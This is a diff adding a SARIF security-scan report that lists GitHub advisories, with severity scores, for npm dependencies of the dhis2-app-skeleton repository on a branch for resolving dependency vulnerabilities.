+                            "defaultConfiguration": { "level": "warning" },
+                            "fullDescription": {
+                                "text": "[yarn4] GHSA-72xf-g2v4-qvf3\n\nVersions of the package tough-cookie before 4.1.3 are vulnerable to Prototype Pollution due to improper handling of Cookies when using CookieJar in rejectPublicSuffixes=false mode....\n\nReference: https://github.com/advisories"
+                            },
+                            "helpUri": "https://github.com/advisories",
+                            "id": "yarn4::GHSA-72xf-g2v4-qvf3",
+                            "name": "ImproperlyControlledModificationOfObjectPrototypeAttributes('prototypePollution')",
+                            "properties": {
+                                "precision": "high",
+                                "security-severity": "6.5",
+                                "tags": ["security"]
+                            },
+                            "shortDescription": { "text": "[yarn4] GHSA-72xf-g2v4-qvf3" }
+                        },
+                        {
+                            "defaultConfiguration": { "level": "warning" },
+                            "fullDescription": {
+                                "text": "[yarn4] GHSA-848j-6mx2-7j84\n\nThe ECDSA implementation of the Elliptic package generates incorrect signatures if an interim value of 'k' (as computed based on step 3.2 of  RFC 6979 https://datatracker.ietf.org/...\n\nReference: https://github.com/advisories"
+                            },
+                            "helpUri": "https://github.com/advisories",
+                            "id": "yarn4::GHSA-848j-6mx2-7j84",
+                            "name": "UseOfACryptographicPrimitiveWithARiskyImplementation",
+                            "properties": {
+                                "precision": "high",
+                                "security-severity": "5.6",
+                                "tags": ["security"]
+                            },
+                            "shortDescription": { "text": "[yarn4] GHSA-848j-6mx2-7j84" }
+                        },
+                        {
+                            "defaultConfiguration": { "level": "warning" },
+                            "fullDescription": {
+                                "text": "[yarn4] GHSA-93m4-6634-74q7\n\nFiles denied by server.fs.deny (https://vitejs.dev/config/server-options.html#server-fs-deny) were sent if the URL ended with \\ when the dev server is running on Windows.\n\nReference: https://github.com/advisories"
+                            },
+                            "helpUri": "https://github.com/advisories",
+                            "id": "yarn4::GHSA-93m4-6634-74q7",
+                            "name": "ImproperLimitationOfAPathnameToARestrictedDirectory('pathTraversal')",
+                            "properties": {
+                                "precision": "high",
+                                "security-severity": "5",
+                                "tags": ["security"]
+                            },
+                            "shortDescription": { "text": "[yarn4] GHSA-93m4-6634-74q7" }
+                        },
+                        {
+                            "defaultConfiguration": { "level": "warning" },
+                            "fullDescription": {
+                                "text": "[yarn4] GHSA-c27g-q93r-2cwf\n\nDue to the insufficient sanitization of the file argument in the launchEditor, an attacker can execute arbitrary commands on Windows by supplying a filename that contains special c...\n\nReference: https://github.com/advisories"
+                            },
+                            "helpUri": "https://github.com/advisories",
+                            "id": "yarn4::GHSA-c27g-q93r-2cwf",
+                            "name": "ImproperNeutralizationOfSpecialElementsUsedInACommand('commandInjection')",
+                            "properties": {
+                                "precision": "high",
+                                "security-severity": "8",
+                                "tags": ["security"]
+                            },
+                            "shortDescription": { "text": "[yarn4] GHSA-c27g-q93r-2cwf" }
+                        },
+                        {
+                            "defaultConfiguration": { "level": "warning" },
+                            "fullDescription": {
+                                "text": "[yarn4] GHSA-fx2h-pf6j-xcff\n\nThe contents of files that are specified by server.fs.deny (https://vite.dev/config/server-options#server-fs-deny) can be returned to the browser on Windows.\n\nReference: https://github.com/advisories"
+                            },
+                            "helpUri": "https://github.com/advisories",
+                            "id": "yarn4::GHSA-fx2h-pf6j-xcff",
+                            "name": "ImproperLimitationOfAPathnameToARestrictedDirectory('pathTraversal')",
+                            "properties": {
+                                "precision": "high",
+                                "security-severity": "7.5",
+                                "tags": ["security"]
+                            },
+                            "shortDescription": { "text": "[yarn4] GHSA-fx2h-pf6j-xcff" }
+                        },
+                        {
+                            "defaultConfiguration": { "level": "warning" },
+                            "fullDescription": {
+                                "text": "[yarn4] GHSA-g4jq-h2w9-997c\n\nFiles starting with the same name with the public directory were served bypassing the server.fs settings.\n\nReference: https://github.com/advisories"
+                            },
+                            "helpUri": "https://github.com/advisories",
+                            "id": "yarn4::GHSA-g4jq-h2w9-997c",
+                            "name": "ImproperLimitationOfAPathnameToARestrictedDirectory('pathTraversal')",
+                            "properties": {
+                                "precision": "high",
+                                "security-severity": "2",
+                                "tags": ["security"]
+                            },
+                            "shortDescription": { "text": "[yarn4] GHSA-g4jq-h2w9-997c" }
+                        },
+                        {
+                            "defaultConfiguration": { "level": "warning" },
+                            "fullDescription": {
+                                "text": "[yarn4] GHSA-g7r4-m6w7-qqqr\n\nThe development server contains a path traversal vulnerability on Windows when serving files from servedir.\n\nReference: https://github.com/advisories"
+                            },
+                            "helpUri": "https://github.com/advisories",
+                            "id": "yarn4::GHSA-g7r4-m6w7-qqqr",
+                            "name": "ImproperLimitationOfAPathnameToARestrictedDirectory('pathTraversal')",
+                            "properties": {
+                                "precision": "high",
+                                "security-severity": "2.5",
+                                "tags": ["security"]
+                            },
+                            "shortDescription": { "text": "[yarn4] GHSA-g7r4-m6w7-qqqr" }
+                        },
+                        {
+                            "defaultConfiguration": { "level": "warning" },
+                            "fullDescription": {
+                                "text": "[yarn4] GHSA-g974-hxvm-x689\n\nAll versions of the package node-gettext are vulnerable to Prototype Pollution via the addTranslations() function in gettext.js due to improper user input sanitization.\n\nReference: https://github.com/advisories"
+                            },
+                            "helpUri": "https://github.com/advisories",
+                            "id": "yarn4::GHSA-g974-hxvm-x689",
+                            "name": "ImproperlyControlledModificationOfObjectPrototypeAttributes('prototypePollution')",
+                            "properties": {
+                                "precision": "high",
+                                "security-severity": "5.9",
+                                "tags": ["security"]
+                            },
+                            "shortDescription": { "text": "[yarn4] GHSA-g974-hxvm-x689" }
+                        },
+                        {
+                            "defaultConfiguration": { "level": "warning" },
+                            "fullDescription": {
+                                "text": "[yarn4] GHSA-gv7w-rqvm-qjhr\n\nThe esbuild Deno module (lib/deno/mod.ts) downloads native binary executables from an npm registry and writes them to disk with executable permissions (0o755) **without performing ...\n\nReference: https://github.com/advisories"
+                            },
+                            "helpUri": "https://github.com/advisories",
+                            "id": "yarn4::GHSA-gv7w-rqvm-qjhr",
+                            "name": "UntrustedSearchPath",
+                            "properties": {
+                                "precision": "high",
+                                "security-severity": "8.1",
+                                "tags": ["security"]
+                            },
+                            "shortDescription": { "text": "[yarn4] GHSA-gv7w-rqvm-qjhr" }
+                        },
+                        {
+                            "defaultConfiguration": { "level": "warning" },
+                            "fullDescription": {
+                                "text": "[yarn4] GHSA-jqfw-vq24-v9c3\n\nAny HTML files on the machine were served regardless of the server.fs settings.\n\nReference: https://github.com/advisories"
+                            },
+                            "helpUri": "https://github.com/advisories",
+                            "id": "yarn4::GHSA-jqfw-vq24-v9c3",
+                            "name": "RelativePathTraversal",
+                            "properties": {
+                                "precision": "high",
+                                "security-severity": "2",
+                                "tags": ["security"]
+                            },
+                            "shortDescription": { "text": "[yarn4] GHSA-jqfw-vq24-v9c3" }
+                        },
+                        {
+                            "defaultConfiguration": { "level": "warning" },
+                            "fullDescription": {
+                                "text": "[yarn4] GHSA-mh99-v99m-4gvg\n\nexpand() bounds the *number* of results it produces (the max option,\n\nReference: https://github.com/advisories"
+                            },
+                            "helpUri": "https://github.com/advisories",
+                            "id": "yarn4::GHSA-mh99-v99m-4gvg",
+                            "name": "UncontrolledResourceConsumption",
+                            "properties": {
+                                "precision": "high",
+                                "security-severity": "7.5",
+                                "tags": ["security"]
+                            },
+                            "shortDescription": { "text": "[yarn4] GHSA-mh99-v99m-4gvg" }
+                        },
+                        {
+                            "defaultConfiguration": { "level": "warning" },
+                            "fullDescription": {
+                                "text": "[yarn4] GHSA-p5wg-g6qr-c7cg\n\nThere is a Stack Overflow vulnerability in eslint before 9.26.0 when serializing objects with circular references in eslint/lib/shared/serialization.js. The exploit is triggered vi...\n\nReference: https://github.com/advisories"
+                            },
+                            "helpUri": "https://github.com/advisories",
+                            "id": "yarn4::GHSA-p5wg-g6qr-c7cg",
+                            "name": "UncontrolledRecursion",
+                            "properties": {
+                                "precision": "high",
+                                "security-severity": "5.5",
+                                "tags": ["security"]
+                            },
+                            "shortDescription": { "text": "[yarn4] GHSA-p5wg-g6qr-c7cg" }
+                        },
+                        {
+                            "defaultConfiguration": { "level": "warning" },
+                            "fullDescription": {
+                                "text": "[yarn4] GHSA-p8p7-x288-28g6\n\nThe request package through 2.88.2 for Node.js and the @cypress/request package prior to 3.0.0 allow a bypass of SSRF mitigations via an attacker-controller server that does a cros...\n\nReference: https://github.com/advisories"
+                            },
+                            "helpUri": "https://github.com/advisories",
+                            "id": "yarn4::GHSA-p8p7-x288-28g6",
+                            "name": "Server-sideRequestForgery(ssrf)",
+                            "properties": {
+                                "precision": "high",
+                                "security-severity": "6.1",
+                                "tags": ["security"]
+                            },
+                            "shortDescription": { "text": "[yarn4] GHSA-p8p7-x288-28g6" }
+                        },
+                        {
+                            "defaultConfiguration": { "level": "warning" },
+                            "fullDescription": {
+                                "text": "[yarn4] GHSA-pfrx-2q88-qq97\n\nThe got package before 11.8.5 and 12.1.0 for Node.js allows a redirect to a UNIX socket.\n\nReference: https://github.com/advisories"
+                            },
+                            "helpUri": "https://github.com/advisories",
+                            "id": "yarn4::GHSA-pfrx-2q88-qq97",
+                            "properties": {
+                                "precision": "high",
+                                "security-severity": "5.3",
+                                "tags": ["security"]
+                            },
+                            "shortDescription": { "text": "[yarn4] GHSA-pfrx-2q88-qq97" }
+                        },
+                        {
+                            "defaultConfiguration": { "level": "warning" },
+                            "fullDescription": {
+                                "text": "[yarn4] GHSA-q8mj-m7cp-5q26\n\nqs.stringify throws TypeError when called with arrayFormat: 'comma' and encodeValuesOnly: true on an array containing null or undefined. The throw is synchronous and not handled by...\n\nReference: https://github.com/advisories"
+                            },
+                            "helpUri": "https://github.com/advisories",
+                            "id": "yarn4::GHSA-q8mj-m7cp-5q26",
+                            "name": "NullPointerDereference",
+                            "properties": {
+                                "precision": "high",
+                                "security-severity": "5.3",
+                                "tags": ["security"]
+                            },
+                            "shortDescription": { "text": "[yarn4] GHSA-q8mj-m7cp-5q26" }
+                        },
+                        {
+                            "defaultConfiguration": { "level": "warning" },
+                            "fullDescription": {
+                                "text": "[yarn4] GHSA-v245-v573-v5vm\n\nlinkify-it's schema-scan loop (.test() / .match(), the documented public API) invokes the mailto:\n\nReference: https://github.com/advisories"
+                            },
+                            "helpUri": "https://github.com/advisories",
+                            "id": "yarn4::GHSA-v245-v573-v5vm",
+                            "name": "InefficientAlgorithmicComplexity",
+                            "properties": {
+                                "precision": "high",
+                                "security-severity": "7.5",
+                                "tags": ["security"]
+                            },
+                            "shortDescription": { "text": "[yarn4] GHSA-v245-v573-v5vm" }
+                        },
+                        {
+                            "defaultConfiguration": { "level": "warning" },
+                            "fullDescription": {
+                                "text": "[yarn4] GHSA-v6wh-96g9-6wx3\n\nThe launch-editor NPM package accesses arbitrary paths including Windows UNC paths. When a UNC path is opened, Windows automatically attempts NTLM authentication to the remote host...\n\nReference: https://github.com/advisories"
+                            },
+                            "helpUri": "https://github.com/advisories",
+                            "id": "yarn4::GHSA-v6wh-96g9-6wx3",
+                            "name": "ExternalControlOfFileNameOrPath",
+                            "properties": {
+                                "precision": "high",
+                                "security-severity": "5",
+                                "tags": ["security"]
+                            },
+                            "shortDescription": { "text": "[yarn4] GHSA-v6wh-96g9-6wx3" }
+                        },
+                        {
+                            "defaultConfiguration": { "level": "warning" },
+                            "fullDescription": {
+                                "text": "[yarn4] GHSA-vpq2-c234-7xj6\n\nVersions of the package @tootallnate/once before 3.0.1 are vulnerable to Incorrect Control Flow Scoping in promise resolving when AbortSignal option is used. The Promise remains in...\n\nReference: https://github.com/advisories"
+                            },
+                            "helpUri": "https://github.com/advisories",
+                            "id": "yarn4::GHSA-vpq2-c234-7xj6",
+                            "name": "IncorrectControlFlowScoping",
+                            "properties": {
+                                "precision": "high",
+                                "security-severity": "3.3",
+                                "tags": ["security"]
+                            },
+                            "shortDescription": { "text": "[yarn4] GHSA-vpq2-c234-7xj6" }
+                        },
+                        {
+                            "defaultConfiguration": { "level": "warning" },
+                            "fullDescription": {
+                                "text": "[yarn4] GHSA-w5hq-g745-h8pq\n\nThe v3(), v5(), and v6() API methods (https://github.com/uuidjs/uuid#api-summary) (not uuid release versions) accept external output buffers but do not reject out-of-range writes (...\n\nReference: https://github.com/advisories"
+                            },
+                            "helpUri": "https://github.com/advisories",
+                            "id": "yarn4::GHSA-w5hq-g745-h8pq",
+                            "name": "Out-of-boundsWrite",
+                            "properties": {
+                                "precision": "high",
+                                "security-severity": "7.5",
+                                "tags": ["security"]
+                            },
+                            "shortDescription": { "text": "[yarn4] GHSA-w5hq-g745-h8pq" }
+                        }
+                    ],
+                    "version": "4.13.6"
+                }
+            },
+            "versionControlProvenance": [
+                {
+                    "branch": "refs/heads/security/resolve-dependency-vulnerabilities",
+                    "repositoryUri": "https://github.com/EyeSeeTea/dhis2-app-skeleton",
+                    "revisionId": "3fcdcd17ef5ee6597a119474dcf24cb9baf953c0"
+                }
+            ]
+        }
+    ],
+    "$schema": "https://raw.githubusercontent.com/oasis-tcs/sarif-spec/master/Schemata/sarif-schema-2.1.0.json",
+    "version": "2.1.0"
+}
